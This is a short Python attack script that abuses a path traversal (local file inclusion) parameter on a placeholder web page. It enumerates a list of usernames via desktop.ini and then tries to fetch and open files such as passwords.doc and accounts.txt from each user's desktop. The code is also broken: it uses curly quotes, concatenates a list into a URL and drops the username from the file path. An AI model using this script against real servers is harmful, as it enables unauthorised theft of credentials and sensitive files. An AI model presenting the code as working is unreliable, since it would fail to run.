import requests
import webbrowser

url = 'http://www.testpage.com?page='

LFI = '../../../../../../../../../'

usernames = ['bob.jones', 'tom.johnson', 'mary.thomas', 'bill.smith']

desktopini = '/Desktop/desktop.ini'

usersfiles = ['accounts.txt', 'passwords.doc', 'configs.txt', 'sensitiveinfo.doc']

for x in usernames:
    check = requests.get(url + LFI + x + desktopini)
    if check.status_code == 200:
        print(‘User ’ + x + ‘was found’)
        desktopsearch = requests.get(url + LFI + '/Desktop/' + usersfiles)
        if desktopsearch.status_code == 200:
            webbrowser.open(url + LFI + '/Desktop/' + usersfiles)